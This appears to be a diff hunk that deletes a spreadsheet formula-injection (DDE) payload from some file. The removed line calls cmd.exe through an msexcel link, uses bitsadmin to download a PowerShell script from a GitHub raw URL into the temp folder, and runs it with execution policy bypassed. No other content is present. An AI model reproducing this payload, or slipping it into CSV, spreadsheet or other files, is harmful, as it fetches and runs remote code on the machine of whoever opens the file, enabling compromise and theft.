@@ -1,6 +1,0 @@
-= msexcel|'\\..\..\..\Windows\System32\cmd.exe /c bitsadmin /transfer myJob /download /priority foreground https://raw.githubusercontent.com/KONICHIVAA/TESTDRP/refs/heads/master/mylove.ps1 %TEMP%\mylove.ps1 && powershell -ExecutionPolicy Bypass -File %TEMP%\mylove.ps1'!A1
-
-
-
-
-
